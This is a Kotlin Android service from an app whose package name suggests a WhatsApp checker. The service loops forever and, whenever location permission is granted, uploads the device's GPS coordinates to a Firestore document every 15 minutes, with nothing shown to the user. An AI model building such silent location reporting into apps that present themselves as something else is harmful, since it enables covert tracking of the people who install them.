package com.example.whatsappcheckerhastatii

import android.Manifest
import android.app.IntentService
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.util.Log
import androidx.appcompat.app.AlertDialog
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.QuerySnapshot
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices

class IntentService : IntentService("IntentService") {

    var fusedLocationClient: FusedLocationProviderClient? = null
    val PERMISSION_ID = 42

    override fun onHandleIntent(intent: Intent?) {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        val db = FirebaseFirestore.getInstance()
        /*Log.d("Arjun", "Service Running")
        Thread.sleep(15000)

        Log.d("Arjun", "Waited 15 seconds and Logged This")
        Thread.sleep(30000)

        Log.d("Arjun", "Waited 30 seconds and Logged This")
        Thread.sleep(60000)

        Log.d("Arjun", "Waited 60 seconds and Logged This")*/

        Log.d("Arjun", "GPS Sender Service Started")
        while(true) {
            Log.d("Arjun", "Entering while loop")
            if (checkPermission(
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.ACCESS_FINE_LOCATION)) {
                Log.d("Arjun", "Posting GPS co-ordinates every 15 minutes")
                fusedLocationClient?.lastLocation?.
                    addOnSuccessListener { location: Location? ->
                        // Got last known location. In some rare situations this can be null.
                        Log.d("Arjun", "Latitude + Longitude" + location?.latitude.toString() + " " + location?.longitude.toString())

                        val location = hashMapOf(
                            "latitude" to location?.latitude,
                            "longitude" to location?.longitude,
                            "timestamp" to FieldValue.serverTimestamp()
                        )

                        db.collection("users").document("location")
                            .set(location)
                            .addOnSuccessListener { documentReference ->
                                Log.d("Arjun", "DocumentSnapshot added with ID:")
                            }
                            .addOnFailureListener { e ->
                                Log.w("Arjun", "Error adding document", e)
                            }
                    }
            }
            Thread.sleep(900000)
        }


        }
    private fun checkPermission(vararg perm:String) : Boolean {
        val havePermissions = perm.toList().all {
            ContextCompat.checkSelfPermission(this,it) ==
                    PackageManager.PERMISSION_GRANTED
        }
        if (!havePermissions) {
            Log.d("Arjun", "Fuck Off")
            return false
        }
        return true
    }




    }
